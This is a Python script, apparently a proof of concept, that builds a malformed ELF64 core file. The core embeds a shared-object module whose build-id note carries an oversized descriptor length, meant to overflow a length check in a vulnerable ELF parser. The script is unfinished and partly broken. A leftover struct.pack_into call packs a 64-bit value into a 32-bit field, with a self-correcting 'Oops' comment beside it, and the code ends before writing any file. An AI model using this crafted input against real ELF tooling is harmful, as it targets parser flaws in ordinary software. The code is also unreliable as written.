import struct, os
# Create ELF64 little-endian core with one PT_LOAD segment containing an ELF64 DYN module.
PAGE=0x1000
CORE_EHDR=64; PHDR=56
MOD_OFF=0x1000
MOD_VADDR=0x400000
# inner module
inner=bytearray(0x400)  # enough for ehdr, 2 phdrs, note
# ELF64 Ehdr: e_type ET_DYN=3, machine x86_64=62, version=1, phoff=64, ehsize=64, phentsize=56, phnum=2
inner[0:16]=b'\x7fELF' + bytes([2,1,1,0]) + b'\0'*8
struct.pack_into('<HHIQQQIHHHHHH', inner,16, 3,62,1,0,64,0,0,64,56,2,0,0,0)
# inner PT_LOAD offset 0 vaddr 0 filesz/memsz 0x400 align 0x1000
struct.pack_into('<IIQQQQQQ', inner,64, 1,5,0,0,0,0x400,0x400,PAGE)
# inner PT_NOTE offset 0x200 vaddr 0x200 filesz 0x100 align 4
struct.pack_into('<IIQQQQQQ', inner,64+56, 4,4,0x200,0x200,0,0x100,0x100,4)
# note at 0x200: n_namesz=4, n_descsz huge causing len+n_descsz overflow, type NT_GNU_BUILD_ID=3
# Vulnerable parser len after name alignment = 16; n_descsz = 2^64 - 8 -> len+n_descsz = 8 < filesz, so accepted.
struct.pack_into('<III', inner,0x200, 4, 0xfffffffffffffff8, 3)  # But III is 32-bit! GElf_Nhdr fields are 32-bit? GElf_Nhdr n_descsz is uint32_t.
# Oops descsz is 32-bit max can still be excessive ~4GB, no size_t overflow on 64-bit but ASAN malloc huge may abort? Use 0xfffffff0.
struct.pack_into('<III', inner,0x200, 4, 0xfffffff0, 3)

# write core
